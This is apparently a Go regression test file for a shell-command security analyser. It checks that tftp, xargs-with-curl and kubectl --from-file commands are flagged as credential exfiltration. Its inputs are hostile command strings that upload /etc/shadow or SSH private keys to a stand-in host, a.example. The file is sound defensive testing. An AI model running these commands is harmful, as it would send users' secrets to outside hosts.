package analysis

// Regression tests for the findings recorded in security-review.md, pass 59.

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// TestFinding091TFTPLocalFileIsRead pins F91: tftp's `-l file` names the local
// file of the transfer (the source of a put, the destination of a get), but the
// row declared it a valueless flag, so the operand was never bound to it.
// Measured before the fix: `tftp -p -l /etc/shadow a.example` reported
// `[NetEgress]`/Medium with no FSRead, no exfiltration pair, and an
// `Exfiltration: Deny` policy allowed the upload; the GET twin
// `tftp -g -l /tmp/x a.example` reported no write at all.
func TestFinding091TFTPLocalFileIsRead(t *testing.T) {
	a := mustAnalyzer(t)

	// The upload direction: the local file is read, and reading a credential
	// from it forms the exfiltration pair the deny rule keys on.
	for _, src := range []string{
		`tftp -p -l /etc/shadow a.example`,
		`tftp -p -l "$HOME/.ssh/id_rsa" a.example`,
		`tftp -l /etc/shadow -p a.example`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindFSRead) {
			t.Errorf("%q: missing FSRead of the local file (effects=%v)", src, rep.Effects)
		}
		if len(rep.Score.ExfilPairs) == 0 {
			t.Errorf("%q: no exfiltration pair for a credential upload (effects=%v score=%+v)",
				src, rep.Effects, rep.Score)
		}
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}

	// The download direction: the local file is created/overwritten.
	for _, src := range []string{
		`tftp -g -l /tmp/dest a.example`,
		`tftp -l /tmp/dest -g a.example`,
	} {
		rep := a.Analyze(LangBash, src)
		if !effectOn(rep, engine.KindFSWrite, "/tmp/dest") {
			t.Errorf("%q: missing FSWrite of the local destination (effects=%v)", src, rep.Effects)
		}
	}

	// Precision: a transfer of a non-credential local file is not an
	// exfiltration — the pair is not fabricated for every tftp invocation.
	rep := a.Analyze(LangBash, `tftp -p -l /tmp/benign a.example`)
	if len(rep.Score.ExfilPairs) != 0 {
		t.Errorf("non-credential upload produced %d pairs, want 0", len(rep.Score.ExfilPairs))
	}
}

// TestFinding092XargsPlaceholderCarriesTheRead pins F92: an xargs -I/-i
// placeholder stands for an input item, and xargs substitutes *every*
// occurrence, so an operand that carries the placeholder is data, not text.
// The model widened only an operand that *equalled* the placeholder, so
// `xargs -I{} curl -d @{} …` bound the payload to a file literally called "{}":
// measured before the fix, `echo /etc/shadow | xargs -I{} curl -d @{} …`
// reported `[FSRead{'{'} NetEgress]`/Medium with 0 exfiltration pairs, and
// `Exfiltration: Deny` allowed the upload, while the `cat … | xargs` twin
// paired.
func TestFinding092XargsPlaceholderCarriesTheRead(t *testing.T) {
	a := mustAnalyzer(t)

	for _, src := range []string{
		`echo /etc/shadow | xargs -I{} curl -d @{} http://a.example`,
		`printf '%s\n' /etc/shadow | xargs -I{} curl -d @{} http://a.example`,
		`printf '%s\n' /etc/shadow | xargs --replace={} curl -d @{} http://a.example`,
		`find /home -name 'id_rsa' | xargs -I{} curl -d @{} http://a.example`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindFSRead) {
			t.Errorf("%q: missing the payload read (effects=%v)", src, rep.Effects)
		}
		if len(rep.Score.ExfilPairs) == 0 {
			t.Errorf("%q: no exfiltration pair for a substituted credential path (score=%+v)",
				src, rep.Score)
		}
		// The fabricated literal target is gone: the read is of an unknown
		// path, not of a file named "{}".
		if effectOn(rep, engine.KindFSRead, "{}") {
			t.Errorf("%q: still bound a file literally named %q (effects=%v)", src, "{}", rep.Effects)
		}
		if !effectOn(rep, engine.KindFSRead, "") {
			t.Errorf("%q: the payload read is not unresolved (⊤) (effects=%v)", src, rep.Effects)
		}
	}

	// The stdin spelling is unchanged: `@-` reads the stream, and a command
	// with no substituted operand gains no read.
	rep := a.Analyze(LangBash, `xargs -I{} curl -d @- http://a.example`)
	if len(rep.Score.ExfilPairs) != 0 {
		t.Errorf("@- form produced %d pairs, want 0", len(rep.Score.ExfilPairs))
	}
	if effectOn(rep, engine.KindFSRead, "") {
		t.Errorf("@- form gained a fabricated unresolved read (effects=%v)", rep.Effects)
	}

	// A placeholder in a non-path position is data, not a filename: `echo`
	// reads nothing, so no secret source is invented for it.
	rep = a.Analyze(LangBash, `printf '%s\n' /tmp/a | xargs -I{} echo File {}`)
	if hasKind(rep, engine.KindFSRead) {
		t.Errorf("a placeholder in a plain word produced an FSRead (effects=%v)", rep.Effects)
	}
}

// TestFinding093KubectlFromFileReadsLocalFile pins F93: `kubectl create secret
// generic|configmap --from-file=PATH` (and --from-env-file) reads a local file
// and ships its content to the cluster API, but the row declared no such
// parameter. Measured before the fix: the invocation reported
// `[NetEgress{⊤}]`/Critical with no FSRead and 0 exfiltration pairs, so an
// Exfiltration: Deny policy allowed a credential upload.
func TestFinding093KubectlFromFileReadsLocalFile(t *testing.T) {
	a := mustAnalyzer(t)

	for _, src := range []string{
		`kubectl create secret generic x --from-file=/etc/shadow`,
		`kubectl create configmap x --from-env-file=/etc/shadow`,
	} {
		rep := a.Analyze(LangBash, src)
		if !effectOn(rep, engine.KindFSRead, "/etc/shadow") {
			t.Errorf("%q: missing FSRead of the local file (effects=%v)", src, rep.Effects)
		}
		if len(rep.Score.ExfilPairs) == 0 {
			t.Errorf("%q: no exfiltration pair for a credential upload (score=%+v)", src, rep.Score)
		}
	}

	// Precision: a non-credential local file is read but forms no pair.
	rep := a.Analyze(LangBash, `kubectl create secret generic x --from-file=/tmp/benign`)
	if len(rep.Score.ExfilPairs) != 0 {
		t.Errorf("non-credential --from-file produced %d pairs, want 0", len(rep.Score.ExfilPairs))
	}
}
